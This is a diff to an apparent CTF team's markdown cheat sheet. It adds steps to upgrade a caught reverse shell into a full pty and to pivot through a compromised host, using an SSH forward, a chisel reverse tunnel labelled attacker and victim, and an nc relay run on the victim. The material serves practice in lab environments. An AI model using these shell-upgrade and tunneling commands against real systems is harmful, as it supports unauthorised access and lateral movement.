@@ -20,32 +20,62 @@ A collection of commands, tools, techniques and procedures of the purplestorm ct
   - [Reverse Shell](#reverse-shell)
 - [Exfiltrating Data](#exfiltrating-data)
 
+___
 
 ## Basics
 
-### Stabilizing Linux shell
+### Stabilizing Linux Shell / Obtaining a comfy pty (pseudo terminal) 
 
+1. spawn a pty (required for interactive IO such as `su`)
+
+via python2:
+```shell
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+via python3:
+```shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+via `script` (works most of the time when python is not available):
+```shell
 script /dev/null -c bash
-CTRL+Z
-stty raw -echo; fg
-reset
-screen
 ```
 
-### Port forwarding
+2. hit __CTRL+Z__ to background your listener process
+
+3. configure your shell to send IO straight through the connenction and not echo back input.  
+```shell
+stty raw -echo; fg
+```
+this allows for __CTRL+L__ and __CTRL+C__ to work.
+
+4. set the TERM variable for `clear` to work.
+listing alias to not miss any info while 
+```shell
+export SHELL=/bin/bash;
+export TERM=xterm;
+alias ll='ls --color -alhF';
+stty rows 110 cols 240;
+reset;
+```
+
+### (Reverse) Port Forwarding
 
 #### SSH:
 
+TODO local and remote port forward
+
 On kali:
 
-```
+```shell
 ssh -N -L 80:localhost:80 user@10.10.10.10 -C
 ```
 
 #### Chisel:
 
-```
+```shell
 ./chisel server -p 8000 --reverse #Server -- Attacker
 ./chisel client 10.10.16.3:8000 R:100:172.17.0.1:100 #Client -- Victim
 ```
@@ -65,6 +95,8 @@ On victim:
 ```
 nc -nlvp 8080 -c "nc localhost 1234"
 ```
+
+___
 
 ## Transfering files
 
